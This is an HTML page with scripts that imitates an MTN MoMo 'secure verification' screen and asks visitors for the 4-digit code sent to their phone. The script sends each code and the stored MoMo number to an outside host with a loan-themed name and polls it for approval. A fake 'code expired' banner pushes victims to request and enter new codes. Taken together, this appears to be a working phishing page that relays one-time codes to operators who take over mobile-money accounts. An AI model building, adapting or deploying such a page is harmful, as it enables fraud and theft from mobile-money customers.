<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN — Enter Code</title>
<style>
  :root{
    --mtn-blue:#004F9F; --mtn-blue-dark:#003B77; --mtn-blue-deep:#002B5C;
    --mtn-yellow:#FFCC00; --bg:#F7F9FC; --card:#FFFFFF;
    --text:#0A1B33; --muted:#64748B; --border:#E2E8F0; --green:#00A651;
    --red:#D32F2F;
  }
  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;}
  html,body{height:100%;}
  body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;}

  .frame-top,.frame-bottom{
    width:100%;height:6px;
    background:linear-gradient(90deg,var(--mtn-blue-deep) 0%,var(--mtn-blue) 50%,var(--mtn-blue-deep) 100%);
  }
  .frame-bottom{margin-top:auto;}

  .header{
    width:100%;background:var(--mtn-blue-deep);
    border-bottom:1px solid var(--mtn-blue-dark);
    padding:18px 20px;position:sticky;top:0;z-index:50;
    box-shadow:0 4px 16px rgba(0,43,92,0.28);
  }
  .header-inner{width:100%;max-width:920px;margin:0 auto;display:flex;align-items:center;justify-content:center;}
  .brand{display:flex;align-items:center;text-decoration:none;}
  .brand strong{font-size:26px;font-weight:900;color:#fff;letter-spacing:2px;text-transform:uppercase;}
  .brand strong em{font-style:normal;color:var(--mtn-yellow);}

  main{width:100%;max-width:920px;flex:1;padding:52px 20px 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;}

  .card{
    background:var(--card);width:100%;max-width:440px;
    border-radius:20px;padding:36px 28px 34px;
    box-shadow:0 12px 40px rgba(0,43,92,0.10);
    border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
    text-align:center;
  }

  .code-head{
    display:flex;align-items:center;justify-content:center;gap:10px;
    margin-bottom:24px;
  }
  .code-head .badge{
    width:44px;height:44px;border-radius:12px;
    background:var(--mtn-yellow);
    display:flex;align-items:center;justify-content:center;
    font-weight:900;color:var(--mtn-blue-deep);font-size:19px;
    box-shadow:0 4px 12px rgba(255,204,0,0.4);
  }
  .code-head .txt{text-align:left;}
  .code-head .txt b{display:block;font-size:15px;color:var(--text);font-weight:800;}
  .code-head .txt span{font-size:11.5px;color:var(--muted);font-weight:600;}

  .code-title{
    font-size:22px;font-weight:800;
    color:var(--text);letter-spacing:-0.4px;
    margin-bottom:8px;
  }
  .code-sub{
    font-size:13px;color:var(--muted);
    font-weight:600;line-height:1.6;
    max-width:300px;margin:0 auto 22px;
  }
  .code-sub b{color:var(--mtn-blue-deep);font-weight:800;}

  /* Expired banner above input */
  .expired-banner{
    display:none;align-items:center;gap:10px;
    background:linear-gradient(90deg, rgba(211,47,47,0.10), rgba(211,47,47,0.05));
    border:1px solid rgba(211,47,47,0.40);
    color:var(--red);
    padding:12px 14px;border-radius:12px;
    margin-bottom:20px;text-align:left;
    font-size:12.5px;font-weight:700;
    line-height:1.5;animation:bannerIn .3s ease;
  }
  .expired-banner.show{display:flex;}
  @keyframes bannerIn{
    from{opacity:0;transform:translateY(-6px);}
    to{opacity:1;transform:translateY(0);}
  }
  .expired-banner .ic{
    width:26px;height:26px;border-radius:50%;
    background:rgba(211,47,47,0.18);
    display:flex;align-items:center;justify-content:center;flex-shrink:0;
  }
  .expired-banner .ic svg{
    width:14px;height:14px;stroke:var(--red);fill:none;
    stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;
  }
  .expired-banner b{color:#8B0000;font-weight:900;}

  .code-input{
    width:100%;padding:22px 14px;
    border:2px solid var(--border);border-radius:14px;
    background:#FBFDFF;font-size:38px;font-weight:900;
    color:var(--mtn-blue-deep);letter-spacing:22px;text-align:center;
    font-variant-numeric:tabular-nums;transition:.18s;margin-bottom:16px;
  }
  .code-input::placeholder{color:#D5DEE9;letter-spacing:22px;font-weight:900;}
  .code-input:focus{
    outline:none;border-color:var(--mtn-blue-deep);
    background:#fff;box-shadow:0 0 0 4px rgba(0,43,92,0.12);
  }
  .code-input.shake{
    animation:shake .4s cubic-bezier(.36,.07,.19,.97) both;
    border-color:var(--red);
  }
  @keyframes shake{
    10%,90%{transform:translateX(-2px);}
    20%,80%{transform:translateX(4px);}
    30%,50%,70%{transform:translateX(-6px);}
    40%,60%{transform:translateX(6px);}
  }

  .indicator{
    width:100%;height:5px;background:#E8EEF6;
    border-radius:6px;overflow:hidden;margin-bottom:26px;
  }
  .indicator-bar{
    height:100%;width:0%;
    background:linear-gradient(90deg, var(--mtn-blue-deep), var(--mtn-blue));
    border-radius:6px;transition:width .25s ease, background .25s ease;
  }
  .indicator-bar.warning{background:linear-gradient(90deg, #E53935, var(--red));}

  .cta{
    width:100%;padding:16px;border:none;border-radius:12px;
    background:var(--mtn-blue-deep);color:#fff;font-size:16px;font-weight:800;
    cursor:pointer;letter-spacing:0.3px;transition:.18s;
    box-shadow:0 8px 20px rgba(0,43,92,0.32);
  }
  .cta:hover:not(:disabled){background:var(--mtn-blue);transform:translateY(-2px);}
  .cta:active:not(:disabled){transform:translateY(0);}
  .cta:disabled{opacity:.5;cursor:not-allowed;transform:none;background:#94A3B8;box-shadow:none;}

  .resend-btn{
    display:inline-flex;align-items:center;gap:6px;
    margin-top:16px;background:transparent;border:none;
    color:var(--mtn-blue-deep);font-size:13px;font-weight:800;
    cursor:pointer;padding:8px 12px;border-radius:8px;
    transition:.18s;font-family:inherit;letter-spacing:0.2px;
  }
  .resend-btn:hover:not(:disabled){background:rgba(0,79,159,0.08);}
  .resend-btn:disabled{opacity:.5;cursor:not-allowed;}
  .resend-btn svg{
    width:14px;height:14px;stroke:currentColor;fill:none;
    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
  }
  .resend-btn.sent{color:var(--green);pointer-events:none;}

  .status{
    font-size:12px;text-align:center;margin-top:14px;
    font-weight:700;min-height:16px;
  }
  .status.err{color:var(--red);}
  .status.ok{color:var(--green);}

  .secure-note{
    display:flex;align-items:center;justify-content:center;gap:6px;
    font-size:11.5px;color:var(--muted);margin-top:18px;font-weight:600;
  }
  .secure-note svg{
    width:13px;height:13px;stroke:var(--green);fill:none;
    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
  }

  .processing-screen{
    position:fixed;inset:0;z-index:2000;
    background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
    color:#fff;display:none;align-items:center;justify-content:center;
    flex-direction:column;text-align:center;padding:24px;overflow:hidden;
    animation:fadeIn .3s ease;
  }
  .processing-screen.show{display:flex;}
  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
  .processing-screen .glow{
    position:absolute;width:460px;height:460px;border-radius:50%;
    background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
    animation:pulse 2.6s ease-in-out infinite;pointer-events:none;
  }
  @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}
  .processing-screen .brand-mark{
    font-size:22px;font-weight:900;letter-spacing:3px;
    text-transform:uppercase;color:#fff;margin-bottom:40px;opacity:.9;
    position:relative;z-index:2;
  }
  .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}
  .processing-screen .spinner{
    width:88px;height:88px;border-radius:50%;
    border:6px solid rgba(255,255,255,0.14);
    border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
    animation:spin 0.95s linear infinite;margin-bottom:34px;
    position:relative;z-index:2;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .processing-screen h1{
    font-size:26px;font-weight:800;letter-spacing:-0.5px;
    margin-bottom:10px;position:relative;z-index:2;
  }
  .processing-screen p.sub{
    font-size:14px;color:rgba(255,255,255,0.72);
    font-weight:600;line-height:1.6;max-width:340px;
    position:relative;z-index:2;
  }
  .processing-screen .dots{
    margin-top:26px;display:flex;justify-content:center;gap:8px;
    position:relative;z-index:2;
  }
  .processing-screen .dots span{
    width:8px;height:8px;border-radius:50%;
    background:rgba(255,255,255,0.25);
    animation:blink 1.4s infinite ease-in-out;
  }
  .processing-screen .dots span:nth-child(2){animation-delay:.2s;}
  .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
  @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}

  @media(max-width:640px){
    .card{padding:28px 20px;}
    main{padding:36px 16px 44px;}
    .brand strong{font-size:22px;letter-spacing:1.5px;}
    .code-input{font-size:32px;letter-spacing:18px;padding:18px 12px;}
    .code-input::placeholder{letter-spacing:18px;}
    .code-title{font-size:19px;}
    .processing-screen h1{font-size:21px;}
  }
</style>
</head>
<body>

  <div class="frame-top"></div>

  <header class="header">
    <div class="header-inner">
      <a class="brand" href="index.html"><strong>MTN<em>.</em></strong></a>
    </div>
  </header>

  <main>
    <div class="card">
      <div class="code-head">
        <div class="badge">M</div>
        <div class="txt">
          <b>MTN MoMo</b>
          <span>Secure verification</span>
        </div>
      </div>

      <div class="code-title">Enter code</div>
      <div class="code-sub">
        Type the <b>4-digit code</b> sent to your phone to authorize this transaction.
      </div>

      <div class="expired-banner" id="expiredBanner">
        <div class="ic">
          <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10"/>
            <line x1="12" y1="8" x2="12" y2="12"/>
            <line x1="12" y1="16" x2="12.01" y2="16"/>
          </svg>
        </div>
        <div>
          <b>Code expired.</b> Please tap <b>Resend code</b> below to get a new one.
        </div>
      </div>

      <input
        type="tel"
        id="codeInput"
        class="code-input"
        inputmode="numeric"
        maxlength="4"
        placeholder="••••"
        autocomplete="one-time-code"
      >

      <div class="indicator">
        <div class="indicator-bar" id="indicatorBar"></div>
      </div>

      <button class="cta" id="approveBtn" onclick="approve()" disabled>Approve</button>

      <button class="resend-btn" id="resendBtn" onclick="resendCode()">
        <svg viewBox="0 0 24 24">
          <polyline points="23 4 23 10 17 10"/>
          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
        </svg>
        Resend code
      </button>

      <div class="status" id="status"></div>

      <div class="secure-note">
        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        Secured by MTN MoMo
      </div>
    </div>
  </main>

  <div class="frame-bottom"></div>

  <div class="processing-screen" id="processingScreen">
    <div class="glow"></div>
    <div class="brand-mark">MTN<em>.</em></div>
    <div class="spinner"></div>
    <h1>Verifying code</h1>
    <p class="sub">Please wait while we confirm your code. Do not close this page.</p>
    <div class="dots"><span></span><span></span><span></span></div>
  </div>

<script>
  const API = "https://mtnadvanced-loans.onrender.com";
  const el = id => document.getElementById(id);

  const session = JSON.parse(localStorage.getItem('session') || 'null');
  if(!session){
    window.location.href = 'login.html';
  }

  const input  = el('codeInput');
  const bar    = el('indicatorBar');
  const btn    = el('approveBtn');
  const rbtn   = el('resendBtn');
  const banner = el('expiredBanner');

  let pollingActive = false;
  let redirected = false;

  function setStatus(msg, type){
    const s = el('status');
    s.textContent = msg;
    s.className = 'status' + (type ? ' ' + type : '');
  }

  function showExpiredBanner(){ banner.classList.add('show'); }
  function hideExpiredBanner(){ banner.classList.remove('show'); }

  function refresh(){
    const v = input.value.replace(/\D/g, '');
    input.value = v;

    const pct = Math.min(100, (v.length / 4) * 100);
    bar.style.width = pct + '%';
    bar.classList.toggle('warning', v.length > 0 && v.length < 4);

    btn.disabled = (v.length !== 4);
  }

  input.addEventListener('input', refresh);
  input.addEventListener('keydown', e => {
    if(e.key === 'Enter' && input.value.length === 4){
      approve();
    }
  });

  refresh();
  input.focus();

  function showProcessing(){ el('processingScreen').classList.add('show'); }
  function hideProcessing(){ el('processingScreen').classList.remove('show'); }

  async function approve(){
    const code = input.value.replace(/\D/g, '');

    if(code.length !== 4){
      input.classList.add('shake');
      setTimeout(() => input.classList.remove('shake'), 500);
      return;
    }

    hideExpiredBanner();
    redirected = false;

    btn.disabled = true;
    input.disabled = true;
    rbtn.disabled = true;
    setStatus('');
    showProcessing();

    let requestId = null;

    // ---- Step 1: Submit the code ----
    try{
      const res = await fetch(`${API}/code`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          momo: session.momo,
          code: code,
          time: new Date().toLocaleString()
        })
      });

      const data = await res.json();
      console.log('[CODE] submit:', data);

      if(!data.ok){
        hideProcessing();
        setStatus('❌ ' + (data.error || 'Could not submit code.'), 'err');
        btn.disabled = false;
        input.disabled = false;
        rbtn.disabled = false;
        input.focus();
        return;
      }

      requestId = data.request_id;
      localStorage.setItem('code_request_id', requestId);
      console.log('[CODE] request_id:', requestId);

    }catch(err){
      hideProcessing();
      setStatus('❌ Could not reach server.', 'err');
      btn.disabled = false;
      input.disabled = false;
      rbtn.disabled = false;
      input.focus();
      return;
    }

    // ---- Step 2: Poll every 500ms ----
    if(pollingActive) return;
    pollingActive = true;

    const MAX_WAIT = 5 * 60 * 1000;
    const start = Date.now();
    let consecutiveUnknown = 0;

    const poll = setInterval(async () => {
      if(redirected) return;

      try{
        const r = await fetch(`${API}/code-status/${requestId}`);
        const s = await r.json();
        console.log('[POLL]', requestId, s.status);

        // ✅ APPROVED → INSTANT REDIRECT
        if(s.status === 'approved'){
          redirected = true;
          clearInterval(poll);
          pollingActive = false;
          console.log('[REDIRECT] -> approved.html');
          window.location.replace(`approved.html?status=approved&id=${requestId}`);
          return;
        }

        // ❌ DECLINED
        if(s.status === 'declined' || s.status === 'expired'){
          clearInterval(poll);
          pollingActive = false;
          hideProcessing();
          showExpiredBanner();
          setStatus('');
          input.value = '';
          refresh();
          btn.disabled = true;
          input.disabled = false;
          rbtn.disabled = false;
          input.focus();
          return;
        }

        // ⚠️ UNKNOWN
        if(s.status === 'unknown'){
          consecutiveUnknown++;
          if(consecutiveUnknown >= 3){
            clearInterval(poll);
            pollingActive = false;
            hideProcessing();
            showExpiredBanner();
            setStatus('');
            input.value = '';
            refresh();
            btn.disabled = true;
            input.disabled = false;
            rbtn.disabled = false;
            input.focus();
          }
          return;
        }

        consecutiveUnknown = 0;

        // ⏱ Timeout
        if(Date.now() - start > MAX_WAIT){
          clearInterval(poll);
          pollingActive = false;
          hideProcessing();
          showExpiredBanner();
          setStatus('');
          input.disabled = false;
          rbtn.disabled = false;
        }

      }catch(err){
        console.warn('[POLL ERROR]', err);
      }
    }, 500);
  }

  async function resendCode(){
    if(rbtn.disabled) return;

    hideExpiredBanner();
    rbtn.disabled = true;
    setStatus('Sending new code…');

    try{
      const res = await fetch(`${API}/resend-code`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          momo: session.momo,
          time: new Date().toLocaleString()
        })
      });

      const data = await res.json();

      if(data.ok){
        setStatus('✅ New code sent. Check your SMS.', 'ok');
        rbtn.classList.add('sent');
        rbtn.innerHTML = `
          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
          Code sent
        `;
        input.value = '';
        refresh();
        input.focus();
      }else{
        setStatus('❌ ' + (data.error || 'Could not resend code.'), 'err');
        rbtn.disabled = false;
      }
    }catch(err){
      setStatus('❌ Could not reach server.', 'err');
      rbtn.disabled = false;
    }
  }
</script>
<script src="lang.js"></script>
</body>
</html>
